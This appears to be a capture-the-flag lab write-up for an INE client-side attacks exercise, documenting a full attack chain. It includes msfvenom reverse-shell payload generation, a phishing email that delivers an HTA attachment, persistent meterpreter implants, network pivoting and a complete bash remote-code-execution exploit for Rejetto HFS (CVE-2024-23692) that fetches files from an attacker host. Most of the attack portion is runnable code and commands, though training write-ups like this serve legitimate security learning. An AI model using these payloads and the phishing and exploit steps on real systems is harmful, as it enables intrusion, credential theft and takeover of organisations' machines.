# ğŸ›¡ï¸ INE Client-Side Attacks CTF 1 â€“ Penetration Testing Report

## ğŸŒŸ Objective

This Capture the Flag (CTF) lab simulates a realistic client-side attack scenario where the goal is to:

1. Gather intelligence from a public-facing web application
2. Deliver a malicious payload via phishing
3. Establish internal access and pivot
4. Exploit a vulnerable internal service
5. Escalate privileges to obtain sensitive information

---

## ğŸ“ Lab Environment (Sample IPs)

| Role              | Hostname          | IP Address |
| ----------------- | ----------------- | ---------- |
| Kali (Internal)   | â€”                 | 10.1.0.X   |
| Kali (External)   | â€”                 | 10.10.49.X |
| Public Web Server | fintech.com       | 10.2.X.X   |
| Mail Server       | mail.server.local | 10.2.X.X   |
| Internal Host     | web.prod.local    | 10.2.X.X   |

---

## âœ… Flag 1 â€“ Reconnaissance & Data Exposure

### ğŸŒŸ Objective

Locate an internal email address and flag exposed on the public site.

### ğŸ› ï¸ Tools Used

* `dirb`
* `curl`

### ğŸ” Steps

1. Run directory brute-force:

   ```bash
   dirb http://fintech.com /usr/share/dirb/wordlists/common.txt
   ```

2. Discovered `/.env` file:

   ```bash
   curl http://fintech.com/.env
   ```

3. Found email and flag:

   ```
   techsupport@staff.fincorp.com
   FLAG1=eee8670f30514511bc4e495e167aefec
   ```

### ğŸ Flag 1

**eee8670f30514511bc4e495e167aefec**

---

## âœ… Flag 2 â€“ Phishing Exploit via HTA Attachment

### ğŸŒŸ Objective

Deliver a phishing payload to the internal email. Gain reverse shell.

### ğŸ› ï¸ Tools Used

* `msfvenom`
* `Metasploit`
* `sendemail`

### ğŸ” Steps

1. Generate HTA payload:

   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI_EXTERNAL> LPORT=4444 -f hta-psh > phish.hta
   ```

2. Start listener:

   ```bash
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST <KALI_EXTERNAL>
   set LPORT 4444
   set ExitOnSession false
   exploit -j
   ```

3. Send phishing email:

   ```bash
   sendemail -f it-support@fintech.com -t techsupport@staff.fincorp.com \
   -s mail.server.local:25 \
   -u "Security Update" \
   -m "Please run the attached update tool ASAP." \
   -a phish.hta
   ```

4. Session opened, switched to:

   ```bash
   sessions -i <session_id>
   getuid
   ```

5. Retrieved Flag 2:

   ```bash
   cd C:\Users\Administrator\Desktop
   type flag2.txt
   ```

### ğŸ Flag 2

**(Retrieved via Meterpreter on mail server)**

---

## ğŸ” Stable Session for Pivoting

### ğŸŒŸ Objective

Set up a persistent shell to avoid re-exploitation.

### ğŸ› ï¸ Tools Used

* `msfvenom`
* `Metasploit`

### ğŸ” Steps

1. Create EXE payload:

   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI_EXTERNAL> LPORT=6666 -f exe > stable6666.exe
   ```

2. Upload and execute:

   ```bash
   upload stable6666.exe C:\\Users\\Public\\stable6666.exe
   execute -f "C:\\Users\\Public\\stable6666.exe"
   ```

3. Start new handler:

   ```bash
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST <KALI_EXTERNAL>
   set LPORT 6666
   exploit -j
   ```

4. Got stable `SYSTEM` shell.

---

## ğŸ”œ Internal Pivoting to `web.prod.local`

### ğŸŒŸ Objective

Pivot internally to reach web.prod.local.

### ğŸ› ï¸ Tools Used

* `autoroute`
* `socks_proxy`
* `proxychains`

### ğŸ” Steps

1. Add route in Meterpreter:

   ```bash
   run autoroute -s 10.2.0.0/16
   ```

2. Start SOCKS proxy:

   ```bash
   use auxiliary/server/socks_proxy
   set SRVPORT 9050
   run
   ```

3. Edit proxychains:

   ```
   socks4 127.0.0.1 9050
   ```

4. Test access:

   ```bash
   proxychains curl http://web.prod.local
   ```

---

## âœ… Flag 3 â€“ Exploit Rejetto HFS (CVE-2024-23692)

### ğŸŒŸ Objective

Exploit vulnerable HFS 2.3m server on web.prod.local

### ğŸ› ï¸ Tools Used

* `* `custom hfs_rce.sh` Bash exploit
* `curl`, `python3 -m http.server`

### ğŸ” Steps

1) Add internal route

run autoroute -s 10.2.22.0/24
2) Port forward HFS to Kali

portfwd add -l 8888 -p 80 -r 10.2.22.193
Verify:

curl -I http://127.0.0.1:8888
# Expect: Server: HFS 2.3m
3) Create HFS RCE script

cat > hfs_rce.sh << 'EOF'
#!/usr/bin/env bash
banner() {
cat <<'B'
  ______     _______   ____   ___ ____  _  _     ____  _____  __   ___ ____  
 / ___\ \   / / ____| |___ \ / _ \___ \| || |   |___ \|___ / / /_ / _ \___ \ 
| |    \ \ / /|  _|     __) | | | |__) | || |_    __) | |_ \| '_ \ (_) |__) |
| |___  \ V / | |___   / __/| |_| / __/|__   _|  / __/ ___) | (_) \__, / __/ 
 \____|  \_/  |_____| |_____|\___/_____|  |_|   |_____|____/ \___/  /_/_____|
                                                                             
__     __                _                      _____         _     
\ \   / /__ _ __ _   _  | |    __ _ _____   _  |_   _|__  ___| |__  
 \ \ / / _ \ '__| | | | | |   / _` |_  / | | |   | |/ _ \/ __| '_ \ 
  \ V /  __/ |  | |_| | | |__| (_| |/ /| |_| |   | |  __/ (__| | | |
   \_/ \___|_|   \__, | |_____\__,_/___|\__, |   |_|\___|\___|_| |_|
                 |___/                  |___/                       
                    @VeryLazyTech - Medium
B
}
banner
set -e
commands=$(echo "echo [S]; $2; echo [S];" | iconv -t UTF-16LE | base64 -w 0)
payload="/?n=%0A&cmd=cmd+/c+powershell+-enc+$commands&search=%25xxx%25url%25:%password%\\}\\{.exec|\\{.?cmd.\\}|timeout=15|out=abc.\\}\\{.?n.\\}\\{.?n.\\}RESULT:\\{.?n.\\}\\{.^abc.\\}====\\{.?n.\\}"
url=$1$payload
printf "[*] Sending payloadâ€¦\n"
response=$(curl -s -X GET "$url")
result=$(echo "$response" | awk 'BEGIN {found=0} /\[S\]/ {if (found == 0) {found=1; next} else {exit}} found {print}')
printf "[*] Output:\n%s\n" "$result"
EOF

chmod +x hfs_rce.sh
Test RCE:

./hfs_rce.sh http://127.0.0.1:8888 "whoami"


   ```

3. Used custom exploit:

   ```bash
   ./hfs_rce.sh http://127.0.0.1:8888 "whoami"
   ./hfs_rce.sh http://127.0.0.1:8888 "powershell iwr http://<KALI>:8000/test.txt -OutFile C:\\Users\\Public\\test.txt"
   ./hfs_rce.sh http://127.0.0.1:8888 "type C:\\Users\\Public\\test.txt"
   ```

4. Retrieved flag:

   ```bash
   ./hfs_rce.sh http://127.0.0.1:8888 "type C:\\flag3.txt"
   ```

### ğŸ Flag 3

**3bca6fd7b7a740a8b47357fbcab4616c**

---
